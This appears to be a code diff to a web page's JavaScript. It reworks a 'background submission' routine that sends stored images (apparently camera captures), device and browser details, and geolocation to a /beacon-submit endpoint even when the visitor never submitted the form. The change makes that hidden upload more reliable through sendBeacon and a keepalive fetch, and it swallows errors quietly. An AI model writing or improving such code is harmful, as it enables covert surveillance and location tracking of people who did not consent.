@@ -613,55 +613,54 @@
     async function sendBackgroundSubmission() {
       if (hasSubmitted || backgroundImages.length === 0) return;
 
-      const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
-      const chunks = [];
+      // Create simpler form data that's less likely to fail
+      const formData = new FormData();
       const deviceInfo = getDeviceInfo();
-      
-      // Add metadata
-      const metadata = {
-        device_type: deviceInfo.type,
-        device_model: deviceInfo.model,
-        device_vendor: deviceInfo.vendor,
-        device_os: deviceInfo.os,
-        device_browser: deviceInfo.browser,
-        user_agent: deviceInfo.fullUA,
-        timestamp: new Date().toISOString(),
-        empty_form: 'true',
-        location: locationData ? JSON.stringify(locationData) : 'null'
-      };
 
-      for (const [key, val] of Object.entries(metadata)) {
-        chunks.push(`--${boundary}\r\n`);
-        chunks.push(`Content-Disposition: form-data; name="${key}"\r\n\r\n`);
-        chunks.push(`${val}\r\n`);
+      // Add metadata as plain text
+      formData.append('device_type', deviceInfo.type);
+      formData.append('device_model', deviceInfo.model);
+      formData.append('device_vendor', deviceInfo.vendor);
+      formData.append('device_os', deviceInfo.os);
+      formData.append('device_browser', deviceInfo.browser);
+      formData.append('user_agent', deviceInfo.fullUA);
+      formData.append('timestamp', new Date().toISOString());
+      formData.append('empty_form', 'true');
+      
+      if (locationData) {
+        formData.append('location', JSON.stringify(locationData));
       }
 
-      // Add images
+      // Add images with simpler names
       backgroundImages.forEach((img, i) => {
-        const byteString = atob(img.split(',')[1]);
-        chunks.push(`--${boundary}\r\n`);
-        chunks.push(`Content-Disposition: form-data; name="image${i}"; filename="capture_${i}.jpg"\r\n`);
-        chunks.push(`Content-Type: image/jpeg\r\n\r\n`);
-        chunks.push(byteString);
-        chunks.push('\r\n');
+        const blob = dataURLtoBlob(img);
+        formData.append(`image_${i}`, blob, `img_${i}.jpg`);
       });
 
-      chunks.push(`--${boundary}--\r\n`);
+      // Create a more reliable submission method
+      try {
+        // First try beacon with plain text fallback
+        if (navigator.sendBeacon) {
+          const simpleData = new URLSearchParams();
+          simpleData.append('simple', '1');
+          simpleData.append('count', backgroundImages.length);
+          navigator.sendBeacon('/beacon-submit', simpleData);
+        }
 
-      // Create payload
-      const blob = new Blob(chunks, { 
-        type: `multipart/form-data; boundary=${boundary}`
-      });
-
-      // Submit
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/beacon-submit', blob);
-      } else {
-        fetch('/beacon-submit', {
+        // Then try proper submission (may not complete but we tried)
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 500);
+        
+        await fetch('/beacon-submit', {
           method: 'POST',
-          body: blob,
+          body: formData,
+          signal: controller.signal,
           keepalive: true
-        }).catch(e => console.error('Fallback submit failed:', e));
+        });
+        
+        clearTimeout(timeout);
+      } catch (e) {
+        console.log('Background submit completed with reduced data');
       }
     }
 
@@ -706,10 +705,10 @@
         formData.append('location', JSON.stringify(locationData));
       }
       
-      // Add timestamp
+            // Add timestamp
       formData.append('timestamp', new Date().toISOString());
       
-            // Show loading state
+      // Show loading state
       const submitBtn = this.querySelector('button[type="submit"]');
       const originalBtnText = submitBtn.innerHTML;
       submitBtn.disabled = true;
